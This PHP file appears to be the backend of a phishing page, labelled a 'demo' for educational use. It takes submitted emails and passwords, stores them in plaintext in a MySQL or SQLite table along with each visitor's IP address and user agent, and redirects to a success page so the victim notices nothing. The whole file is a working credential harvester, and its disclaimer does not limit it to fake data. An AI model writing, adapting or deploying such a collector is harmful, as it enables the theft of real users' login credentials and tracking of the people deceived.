<?php
// Form handler (demo): validates fields, logs fake creds + IP/UA, then redirects to success.php.
// Do not use real credentials. Educational use only.

declare(strict_types=1);

// Read a POST field safely
function field(string $key): string {
    return isset($_POST[$key]) ? trim((string)$_POST[$key]) : '';
}

$email = field('email');
$password = field('password');

if ($email === '' || $password === '') {
    header('Location: /');
    exit;
}

// Load config (DB + redirect URL)
$config = require __DIR__ . '/config.php';
$driver = $config['driver'] ?? 'sqlite';

try {
    if ($driver === 'mysql') {
        $c = $config['mysql'];
        $dsn = sprintf(
            'mysql:host=%s;port=%s;dbname=%s;charset=%s',
            $c['host'],
            $c['port'],
            $c['dbname'],
            $c['charset']
        );
        $pdo = new PDO($dsn, $c['user'], $c['pass'], [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        // Create table if missing (idempotent)
        $pdo->exec('CREATE TABLE IF NOT EXISTS submissions (
            id INT UNSIGNED NOT NULL AUTO_INCREMENT,
            email VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            ip VARCHAR(45) NOT NULL,
            user_agent TEXT NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            INDEX idx_created_at (created_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;');
        $stmt = $pdo->prepare('INSERT INTO submissions (email, password, ip, user_agent) VALUES (?,?,?,?)');
    } else {
        // SQLite by default
        $dbPath = $config['sqlite']['path'];
        $pdo = new PDO('sqlite:' . $dbPath, options: [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        // Create table if missing
        $pdo->exec('CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT NOT NULL,
            user_agent TEXT NOT NULL,
            created_at TEXT NOT NULL DEFAULT (datetime("now"))
        )');
        $stmt = $pdo->prepare('INSERT INTO submissions(email, password, ip, user_agent) VALUES(?,?,?,?)');
    }

    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $stmt->execute([$email, $password, $ip, $ua]);
} catch (Throwable $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Storage error (demo): ' . $e->getMessage();
    exit;
}

header('Location: success.php');
exit;

